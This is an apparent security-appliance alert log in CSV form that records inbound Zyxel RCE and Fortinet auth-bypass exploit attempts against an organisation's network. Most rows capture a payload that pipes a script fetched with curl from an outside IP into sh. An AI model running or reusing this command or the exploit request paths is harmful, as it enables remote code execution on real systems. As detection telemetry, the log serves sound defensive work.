Date/Timestamp,Detection Severity,Detection Type,Detection Name,Threat Description,Source IP,Destination IP,Protocol,Direction,File Name,Protocol Group,Vlan ID,Risk Type Group,Destination Port,Destination MAC Address,Bot Url,Source Port,Source MAC Address,Domain Name,Hostname,Rule ID,Risk Type,File Extension,True File Type,File Size,Confidence Level,Potential Risk,Recipient,Detected By,Hasqfile,Filenameinarc,Destination Hostname,Source Hostname,Taskid,Source Group Name,Source Network Zone,Destination Group Name,Destination Network Zone,BOT Command,Is Blocked,Dcehash1,Dcehash2,Source User Logon Time 1,Source User Logon Time 2,Source User Logon Time 3,Destination User Logon Time 1,Destination User Logon Time 2,Destination User Logon Time 3,Destination User Name 1,Destination User Name 2,Destination User Name 3,Source User Name 1,Source User Name 2,Source User Name 3,Interested Ip,Peer Ip,Hasdtasres,Sha1,Log Id,Channel Name,Nickname,User Name,Authentication,User Agent,Target Share,Sender,Email Subject,URL,Sha1InArc,AttachmentFileName,AttachmentFileSize,AttachmentFileType,AttachmentSHA1,ccca_flag,ccca_risklevel,ccca_destinationformat,ccca_destination,ccca_detectionsource,ece_severity,attack_phase,Notable Object,cc_server,cc_servertype,malwaretype,event_subclass,FileTypeInArc,Event_Class,Common_Threat_Family,messageId,isHeuristic,isAptRelated,aptGroup,aptCampaign,status,Reference,HTTP Referer,Client Flag,Threat (Virtual Analyzer),Suspicious Object/Deny List Entity,TLS,Sha256,Sha256InArc,AttachmentSHA256,Yara Rule Files (Virtual Analyzer),Yara Rules (Virtual Analyzer),MITRE Version,MITRE Tactics,MITRE Techniques,MITRE Sub-techniques,JA3 Hash,JA3S Hash,Miscellaneous
2025-01-04 10:24:08,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.77,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-77.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.77,1.1.1.1,No Report,,45371954,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.77""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:20:34,Medium,Exploits,,CVE-2022-40684 - FORTINET AUTHBYPASS EXPLOIT - HTTP(REQUEST),51.255.62.1,187.218.48.72,HTTP,External Detection,,HTTP,4095,Others,8015,00:09:0f:09:00:1a,,54797,00:be:75:8f:f4:81,,187.218.48.72:8015,4790,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-72.uninet-ide.com.mx,dale.probe.onyphe.net,,,Unknown,,Unknown,,Unblocked,0,0,,,,,,,,,,,,,187.218.48.72,51.255.62.1,No Report,,45371913,,,,No,,,,,http://187.218.48.72:8015/api/v2/cmdb/system/admin/admin,,,,,,,,,,,4 Major,Point of Entry,"[""URL: http://187.218.48.72:8015/api/v2/cmdb/system/admin/admin""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2022-40684,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:19:50,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.87,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-87.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.87,1.1.1.1,No Report,,45371879,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.87""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:13:41,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.67,UDP,External Detection,,UDP,4095,Others,500,00:be:75:0c:8c:01,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-67.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.67,1.1.1.1,No Report,,45371763,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.67""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:11:56,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.217.245.51,UDP,External Detection,,UDP,4095,Others,500,00:be:75:0c:8c:01,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-217-245-51.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.217.245.51,1.1.1.1,No Report,,45371732,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.217.245.51""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:08:14,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.76,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-76.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.76,1.1.1.1,No Report,,45371645,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.76""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:03:52,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.90,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-90.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.90,1.1.1.1,No Report,,45371595,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.90""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:56:44,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.68,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-68.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.68,1.1.1.1,No Report,,45371483,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.68""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:56:37,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.217.245.54,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:19,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,mailpf2.aeropuertosgap.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.217.245.54,1.1.1.1,No Report,,45371482,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.217.245.54""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:52:40,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.80,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-80.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.80,1.1.1.1,No Report,,45371412,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.80""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:51:11,Low,Exploits,,Possible CVE-2021-27876 - Veritas RCE Exploit - TCP (Response),10.255.128.18,10.255.129.31,TCP,Internal Detection,,TCP,4095,Others,62758,00:09:0f:09:00:20,,10000,00:50:56:b0:74:d6,,,4879,OTHERS,,-65536,0,Low,Potential Risk,,Network Content Inspection Engine,No,,siapbckp.gap.net,siapmail-b.gap.net,,VLAN SIAP DMZ,Trusted,VLAN SIAP SERVIDORES_FISICOS,Trusted,,Unblocked,0,0,,,,01/04/2025 09:51:11,,,gap\gapbackup,,,,,,10.255.129.31,10.255.128.18,No Report,,45371393,,,,No,,,,,,,,,,,,,,,,2 Minor,Lateral Movement,"[""IP address: 10.255.128.18""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2021-27876,,2,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:43:31,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.217.245.55,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:19,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-217-245-55.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.217.245.55,1.1.1.1,No Report,,45371327,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.217.245.55""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:38:49,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.91,UDP,External Detection,,UDP,4095,Others,500,98:18:88:11:b7:ee,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-91.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.91,1.1.1.1,No Report,,45371271,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.91""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:29:53,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.88,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-88.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.88,1.1.1.1,No Report,,45371167,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.88""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:27:20,Medium,Exploits,,CVE-2022-40684 - FORTINET AUTHBYPASS EXPLOIT - HTTP(REQUEST),51.255.62.11,187.218.48.89,HTTP,External Detection,,HTTP,4095,Others,8015,00:09:0f:09:00:1a,,60997,00:be:75:8f:f4:81,,187.218.48.89:8015,4790,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-89.uninet-ide.com.mx,holmes.probe.onyphe.net,,,Unknown,,Unknown,,Unblocked,0,0,,,,,,,,,,,,,187.218.48.89,51.255.62.11,No Report,,45371106,,,,No,,,,,http://187.218.48.89:8015/api/v2/cmdb/system/admin/admin,,,,,,,,,,,4 Major,Point of Entry,"[""URL: http://187.218.48.89:8015/api/v2/cmdb/system/admin/admin""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2022-40684,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:23:19,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.70,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-70.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.70,1.1.1.1,No Report,,45371003,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.70""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 09:22:11,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.217.245.53,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:19,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,mailpf1.aeropuertosgap.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.217.245.53,1.1.1.1,No Report,,45370986,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.217.245.53""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
